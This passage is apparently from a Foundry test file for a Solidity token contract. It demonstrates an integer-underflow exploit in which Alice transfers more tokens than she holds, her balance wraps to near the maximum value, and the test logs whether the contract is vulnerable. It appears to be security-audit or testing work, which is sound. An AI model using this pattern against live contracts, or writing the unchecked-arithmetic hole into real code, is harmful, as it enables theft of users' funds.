    Token token;
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint256 initialSupply = 100;

    function setUp() public {
        token = new Token(initialSupply);
        // Transfer initial funds to Alice directly from the token deployer account
        token.transfer(alice, initialSupply);
    }

    function testTransferUnderflow() public {
        // Verify Alice's initial balance
        uint256 initialBalance = token.balanceOf(alice);
        assertEq(initialBalance, initialSupply, "Alice should have initial supply");

        console2.log("--- BEFORE-Underflow Transfer ---");
        uint256 aliceBalanceBefore = token.balanceOf(alice);
        uint256 bobBalanceBefore = token.balanceOf(bob);
        uint256 totalSupplyBefore = token.totalSupply();
        console2.log("Alice balance: %d", aliceBalanceBefore);
        console2.log("Bob balance: %d", bobBalanceBefore);
        console2.log("Total supply: %d", totalSupplyBefore);

        console2.log("--- TRIGGER Underflow Transfer (Alice sends %d tokens to Bob) ---", initialSupply + 10);
        // Attempt to transfer more tokens than Alice has
        vm.prank(alice);
        token.transfer(bob, initialSupply + 10); // Transfer amount > balance

        console2.log("--- AFTER-Underflow Transfer ---");
        uint256 aliceBalanceAfter = token.balanceOf(alice);
        uint256 bobBalanceAfter = token.balanceOf(bob);
        uint256 totalSupplyAfter = token.totalSupply();
        console2.log("Alice balance: %d", aliceBalanceAfter);
        console2.log("Bob balance: %d", bobBalanceAfter);
        console2.log("Total supply: %d", totalSupplyAfter);

        // Vulnerability detection logic
        bool aliceUnderflowed = (aliceBalanceAfter == type(uint256).max - 9);
        bool bobReceivedFullAmount = (bobBalanceAfter == initialSupply + 10);
        bool totalSupplyUnchanged = (totalSupplyAfter == totalSupplyBefore);

        console2.log("Check 1 - Alice underflowed: %s", aliceUnderflowed ? "YES" : "NO");
        console2.log("Check 2 - Bob received full 110: %s", bobReceivedFullAmount ? "YES" : "NO");
        console2.log("Check 3 - Total supply unchanged: %s", totalSupplyUnchanged ? "YES" : "NO");

        bool vulnerabilityDemonstrated = aliceUnderflowed && bobReceivedFullAmount;
        console2.log("Vulnerable State: %s", vulnerabilityDemonstrated ? "CORRUPTED" : "SAFE");

        // Final verdict based on state changes
        if (vulnerabilityDemonstrated) {
            console2.log("Vulnerability Exists: Underflow occurred - Alice balance overflowed to max-9 while Bob received excess tokens");
        } else {
            console2.log("Vulnerability not Exist: No underflow detected or transfer rejected");
        }

        // Error-handled assertions to not interfere with verdict printing
        string memory assertMessage = "";
        try this.compareBalances(aliceBalanceAfter, bobBalanceAfter) returns (string memory message) {
            assertMessage = message;
            fail(assertMessage);
        } catch Error(string memory err) {
            emit log_string(err);
        } catch {
            emit log_string("UNKNOWN ASSERTION FAILURE");
        }
        if (bytes(assertMessage).length > 0) revert(assertMessage);
    }

    // External comparison to isolate assertion reverts
    function compareBalances(
        uint256 aliceBalanceAfter, 
        uint256 bobBalanceAfter
    ) external returns (string memory) {
        string memory err = "";

        // Check Alice's balance manually to avoid immediate revert
        if (aliceBalanceAfter != type(uint256).max - 9) {
            err = string.concat(
                "Alice's balance underflow mismatch!",
                "\n  Expected: ", vm.toString(type(uint256).max - 9),
                "\n  Actual:   ", vm.toString(aliceBalanceAfter)
            );
            return err;
        }

        // Check Bob's balance manually
        if (bobBalanceAfter != initialSupply + 10) {
            err = string.concat(
                "Bob's balance mismatch!",
                "\n  Expected: ", vm.toString(initialSupply + 10),
                "\n  Actual:   ", vm.toString(bobBalanceAfter)
            );
            return err;
        }
        return err;
    }
}
